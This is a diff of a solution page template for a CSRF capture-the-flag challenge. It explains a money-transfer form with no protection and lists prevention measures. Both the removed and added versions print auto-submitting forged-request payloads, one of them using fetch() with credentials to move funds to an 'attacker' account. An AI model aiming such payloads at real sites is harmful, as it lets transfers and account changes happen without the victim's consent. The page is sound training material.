@@ -1,88 +1,76 @@
 {% extends 'base.html' %}
 
-{% block title %}CSRF Level 1 Solution - R00tGlyph{% endblock %}
+{% block title %}Solution: CSRF Level 1{% endblock %}
 
 {% block content %}
 <div class="row">
-    <div class="col-md-10 offset-md-1">
+    <div class="col-md-8 offset-md-2">
         <div class="card">
-            <div class="card-header bg-dark text-white">
-                <h2 class="text-center">CSRF Level 1 Solution: Basic Form CSRF</h2>
+            <div class="card-header">
+                <h2 class="text-center"><i class="bi bi-check-circle-fill text-success me-2"></i>Solution: Level 1 - Basic Form CSRF</h2>
             </div>
-            <div class="card-body">
-                <div class="alert alert-info">
-                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
-                    <p>This challenge demonstrates the most fundamental CSRF vulnerability where forms lack any protection mechanism.</p>
+            <div class="card-body solution-content">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This page contains a basic CSRF (Cross-Site Request Forgery) vulnerability. The money transfer form
+                    accepts POST requests without any protection mechanism to verify that the request originated from
+                    the legitimate application.
+                </p>
+                <p>
+                    The vulnerability exists because the form lacks:
+                </p>
+                <ul>
+                    <li>CSRF tokens to validate request origin</li>
+                    <li>Referrer header validation</li>
+                    <li>SameSite cookie attributes</li>
+                    <li>Additional authentication for sensitive operations</li>
+                </ul>
+                
+                <h3>Solution</h3>
+                <p>To solve this challenge, you need to create a malicious HTML page that automatically submits a form to the vulnerable endpoint:</p>
+                <div class="alert alert-secondary">
+                    <code>&lt;!-- Save as malicious.html and open in browser --&gt;</code>
                 </div>
-
-                <div class="card mb-4">
-                    <div class="card-header bg-primary text-white">
-                        <h5 class="mb-0"><i class="bi bi-bullseye me-2"></i>Attack Vector</h5>
-                    </div>
-                    <div class="card-body">
-                        <p>The application accepts form submissions without validating the origin or implementing CSRF tokens. An attacker can create a malicious webpage that automatically submits forms to the vulnerable application when visited by an authenticated user.</p>
-                    </div>
-                </div>
-
-                <div class="card mb-4">
-                    <div class="card-header bg-warning text-white">
-                        <h5 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Needed</h5>
-                    </div>
-                    <div class="card-body">
-                        <ul>
-
-                            <li>Web browser (Chrome, Firefox, etc.)</li>
-                            <li>Text editor for creating HTML forms</li>
-                            <li>Basic understanding of HTML forms</li>
-                            <li>Optional: Burp Suite for request analysis</li>
-                        </ul>
-                    </div>
-                </div>
-
-                <div class="card mb-4">
-                    <div class="card-header bg-success text-white">
-                        <h5 class="mb-0"><i class="bi bi-code-slash me-2"></i>Payload Example</h5>
-                    </div>
-                    <div class="card-body">
-                        <pre class="bg-dark text-light p-3 rounded"><code><!-- Malicious HTML page -->
-<html>
-<body onload="document.forms[0].submit()">
-    <form action="http://target.com/csrf/level1" method="POST">
-        <input type="hidden" name="recipient" value="attacker">
-        <input type="hidden" name="amount" value="1000">
-        <input type="hidden" name="memo" value="malicious transfer">
-    </form>
-</body>
-</html>
-
-<!-- Or using JavaScript -->
-<script>
-fetch('http://target.com/csrf/level1', {
-    method: 'POST',
-    body: 'recipient=attacker&amount=1000&memo=malicious',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    credentials: 'include'
-});
-</script></code></pre>
-                    </div>
-                </div>
-
-                <div class="card mb-4">
-                    <div class="card-header bg-danger text-white">
-                        <h5 class="mb-0"><i class="bi bi-shield-check me-2"></i>Mitigation Strategies</h5>
-                    </div>
-                    <div class="card-body">
-                        <p>Implement CSRF tokens (synchronizer tokens), validate referrer headers, use SameSite cookie attributes, and implement proper session management. For modern applications, consider using double-submit cookies or encrypted token patterns.</p>
-                    </div>
-                </div>
-
-                <div class="text-center mt-4">
-                    <a href="/csrf/level1" class="btn btn-primary me-2">
-                        <i class="bi bi-arrow-left me-1"></i>Back to Challenge
-                    </a>
-                    <a href="/challenges" class="btn btn-secondary">
-                        <i class="bi bi-list me-1"></i>All Challenges
-                    </a>
+                <pre><code>&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+    &lt;form action="http://localhost:5000/csrf/level1" method="POST"&gt;
+        &lt;input type="hidden" name="recipient" value="999999999"&gt;
+        &lt;input type="hidden" name="amount" value="5000"&gt;
+        &lt;input type="hidden" name="memo" value="CSRF Attack - Level 1 Completed!"&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+                <p>
+                    When you open this HTML file in your browser while logged into the application, it will automatically
+                    submit the form and trigger the CSRF vulnerability, revealing the flag.
+                </p>
+                
+                <h3>Real-world Impact</h3>
+                <p>
+                    In a real-world scenario, this type of vulnerability could be used to:
+                </p>
+                <ul>
+                    <li>Transfer money without user consent</li>
+                    <li>Change user account settings or passwords</li>
+                    <li>Post content on behalf of the user</li>
+                    <li>Delete user data or accounts</li>
+                    <li>Perform administrative actions if targeting admin users</li>
+                </ul>
+                
+                <h3>Prevention</h3>
+                <p>To prevent this type of vulnerability, developers should:</p>
+                <ul>
+                    <li>Implement CSRF tokens in all state-changing forms</li>
+                    <li>Validate the Referer and Origin headers</li>
+                    <li>Use SameSite cookie attributes (SameSite=Strict or SameSite=Lax)</li>
+                    <li>Require additional authentication for sensitive operations</li>
+                    <li>Implement proper session management and timeout mechanisms</li>
+                    <li>Use double-submit cookie patterns for additional protection</li>
+                </ul>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('csrf_level1') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
                 </div>
             </div>
         </div>
